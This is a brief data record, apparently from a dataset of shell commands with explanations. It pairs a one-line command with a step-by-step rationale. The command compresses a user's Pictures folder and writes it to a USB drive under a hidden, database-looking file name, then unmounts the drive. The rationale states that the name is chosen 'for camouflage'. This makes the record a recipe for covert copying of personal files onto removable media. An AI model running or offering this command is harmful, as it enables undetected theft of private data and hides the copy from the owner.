command: tar -czf - "$HOME/Pictures" | dd of="/Volumes/USB32/.photoindex.db" bs=4m conv=sync,noerror && sync && diskutil unmount "/Volumes/USB32"
explanation: Compresses the Pictures folder and writes it to a database-looking file on the external drive using dd, then unmounts for quick removal.
rationale_steps: Aggregate image files into a single compressed stream.
Write the stream directly to the USB device via dd.
Name the output to resemble an internal metadata file for camouflage.
Flush and unmount to complete the offline transfer.
